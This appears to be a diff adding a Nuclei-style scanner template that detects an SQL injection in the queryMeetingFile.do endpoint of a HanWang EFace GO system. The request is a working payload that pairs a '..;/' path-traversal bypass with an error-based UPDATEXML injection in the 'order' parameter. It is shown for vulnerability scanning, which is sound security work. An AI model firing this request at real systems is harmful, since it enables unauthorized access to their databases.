@@ -1,0 +1,27 @@
+id: HanWangEFaceGO-queryMeetingFile-sqlInjection
+
+info:
+  name: HanWangEFaceGO-queryMeetingFile-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+    HanWangEFaceGO-queryMeetingFile-sqlInjection
+
+http:
+  - raw:
+      - |
+        GET /manage/intercom/..;/..;/manage/meeting/queryMeetingFile.do?page=1&pageSize=10&mtId=1&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "qqjpq1qpkvq"
+          - "false"
+        condition: and
+
+      - type: status
+        status:
+          - 200
